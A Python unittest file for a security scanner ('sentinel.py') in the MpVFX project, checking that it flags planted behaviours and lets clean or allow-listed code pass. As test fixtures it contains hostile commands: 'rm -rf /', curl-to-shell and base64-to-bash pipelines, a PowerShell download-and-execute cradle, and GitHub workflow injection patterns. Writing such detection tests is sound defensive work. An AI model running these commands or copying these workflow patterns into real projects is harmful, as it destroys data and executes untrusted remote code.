#!/usr/bin/env python3
#===----------------------------------------------------------------------===#
#
# This source file is part of MpVFX.
#
# Copyright (c) 2026 Arshiya Rahgozar.
#
# Licensed under either of the Apache License, Version 2.0 (LICENSE-APACHE or
# http://www.apache.org/licenses/LICENSE-2.0) or the MIT license (LICENSE-MIT
# or http://opensource.org/licenses/MIT), at your option.
#
# SPDX-License-Identifier: MIT OR Apache-2.0
#
#===----------------------------------------------------------------------===#
"""Tests for sentinel.py: planted behaviour is found, legitimate code is not, the allow list applies."""
import importlib.util, os, struct, tempfile, unittest

HERE = os.path.dirname(os.path.abspath(__file__))
spec = importlib.util.spec_from_file_location("sentinel", os.path.join(HERE, "sentinel.py"))
sentinel = importlib.util.module_from_spec(spec)
spec.loader.exec_module(sentinel)


def rules_of(findings):
    return sorted({r[1] for r in findings.rows if r[4] == "**FINDING**"})


class SourceRules(unittest.TestCase):
    def scan(self, path, text, allow=None):
        f = sentinel.Findings({"allow": allow or []})
        sentinel.scan_text(path, text, f)
        return f

    def test_planted_behaviour_in_swift_is_found(self):
        text = ('let s = URLSession.shared\nlet p = Process()\nlet h = dlopen("x", 0)\nCGEventTapCreate(a, b)\n'
                'let k = "ghp_' + "a" * 36 + '"\n')
        self.assertEqual(rules_of(self.scan("mpvfx-swift/Sources/X/A.swift", text)),
                         ["dynamic-load", "network", "process", "secret", "surveillance"])

    def test_c_system_call_and_anti_debug(self):
        f = self.scan("mpvfx-swift/Sources/CX/a.c", 'system("rm -rf /");\nif (IsDebuggerPresent()) exit(0);\n')
        self.assertEqual(rules_of(f), ["anti-debug", "process"])

    def test_the_word_system_in_a_comment_and_gtk_connect_are_not_findings(self):
        f = self.scan("mpvfx-swift/Sources/X/B.swift", '/// watches the system (warning) and calls\nconnect(raw(app), "activate", cb)\n')
        self.assertEqual(rules_of(f), [])

    def test_remote_code_and_eval_in_scripts(self):
        f = self.scan("mpvfx-swift/scripts/x.sh", 'curl -fsSL https://x.example/i.sh | sh\necho ok | base64 -d | bash\n')
        self.assertEqual(rules_of(f), ["remote-code"])
        f = self.scan("mpvfx-swift/scripts/y.py", 'import os\nos.system("ls")\neval(input())\n')
        self.assertEqual(rules_of(f), ["eval"])
        f = self.scan("mpvfx-swift/packaging/windows/z.ps1", 'Invoke-Expression (New-Object Net.WebClient).DownloadString("http://x")\n')
        self.assertEqual(rules_of(f), ["remote-code"])

    def test_trojan_source_and_obfuscated_literal(self):
        f = self.scan("mpvfx-swift/Sources/X/C.swift", 'let a = "abc\u202e"\n')
        self.assertEqual(rules_of(f), ["trojan-source"])
        payload = "".join(chr(33 + (i * 7919) % 90) for i in range(120)).replace('"', "A").replace("\\", "B")
        payload = "".join(c for c in payload if c.isalnum() or c in "+/=_-")
        payload = (payload * 3)[:100]
        f = self.scan("mpvfx-swift/Sources/X/D.swift", f'let blob = "{payload}"\n')
        self.assertIn("obfuscation", rules_of(f))
        sha = "a" * 32 + "0123456789abcdef" * 2   # 64 hex digits: low entropy, not a finding
        self.assertEqual(rules_of(self.scan("mpvfx-swift/Sources/X/E.swift", f'let h = "{sha}{sha}"\n')), [])

    def test_the_allow_list_applies_by_rule_path_and_match(self):
        allow = [{"rule": "process", "path": "mpvfx-swift/Sources/Y/*.swift", "match": "Process()", "reason": "fc-list"}]
        f = self.scan("mpvfx-swift/Sources/Y/Fonts.swift", "let p = Process()\n", allow)
        self.assertEqual(rules_of(f), [])
        self.assertEqual(f.allowed, 1)
        f = self.scan("mpvfx-swift/Sources/Z/Other.swift", "let p = Process()\n", allow)
        self.assertEqual(rules_of(f), ["process"])


class WorkflowRules(unittest.TestCase):
    def scan(self, text):
        f = sentinel.Findings({})
        sentinel.scan_workflow(".github/workflows/w.yml", text, f)
        return f

    def test_unpinned_third_party_action_missing_permissions_and_injection(self):
        text = ("on: pull_request_target\njobs:\n  a:\n    steps:\n      - uses: actions/checkout@v4\n"
                "        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n"
                "      - uses: someone/action@v1\n      - run: echo ${{ github.event.pull_request.title }}\n"
                "      - run: echo ${{ secrets.TOKEN }}\n")
        self.assertEqual(rules_of(self.scan(text)), ["workflow-injection", "workflow-permissions", "workflow-pwn-request",
                                                     "workflow-secret-echo", "workflow-unpinned-action"])

    def test_a_safe_workflow_has_no_findings(self):
        text = ("on: pull_request\npermissions:\n  contents: read\njobs:\n  a:\n    steps:\n"
                "      - uses: actions/checkout@v4\n      - uses: compnerd/gha-setup-swift@" + "a" * 40 + "\n"
                "      - env:\n          BODY: ${{ github.event.comment.body }}\n        run: echo \"$BODY\"\n")
        self.assertEqual(rules_of(self.scan(text)), [])


class FileRules(unittest.TestCase):
    def test_code_magic_in_a_data_file(self):
        self.assertEqual(sentinel.code_magic(b"\x7fELF" + b"\0" * 60), "ELF")
        self.assertEqual(sentinel.code_magic(b"\xcf\xfa\xed\xfe" + b"\0" * 60), "Mach-O")
        self.assertIsNone(sentinel.code_magic(b"\x89PNG\r\n\x1a\n" + b"\0" * 60))
        self.assertIsNone(sentinel.code_magic(b"#!/bin/sh\necho\n"))
        pe = bytearray(b"MZ" + b"\0" * 0x3E)
        struct.pack_into("<I", pe, 0x3C, 0x40)
        pe += b"PE\0\0" + b"\0" * 20
        self.assertEqual(sentinel.code_magic(bytes(pe)), "PE")


class ArtifactBaseline(unittest.TestCase):
    def test_a_new_import_is_a_finding_and_a_missing_baseline_too(self):
        with tempfile.TemporaryDirectory() as d:
            f = sentinel.Findings({})
            sentinel.compare_baseline("MpVFX", "MpVFX", ["libc.so.6"], {"read", "write"}, d, None, f)
            self.assertEqual(rules_of(f), ["import-baseline"])
            with open(os.path.join(d, "MpVFX.imports"), "w") as fh:
                fh.write("lib libc.so.6\nfn read\nfn write\n")
            f = sentinel.Findings({})
            sentinel.compare_baseline("MpVFX", "MpVFX", ["libc.so.6"], {"read", "write", "socket"}, d, None, f)
            self.assertEqual([(r[1], r[2]) for r in f.rows if r[4] == "**FINDING**"], [("import-added", "fn socket")])


if __name__ == "__main__":
    unittest.main()
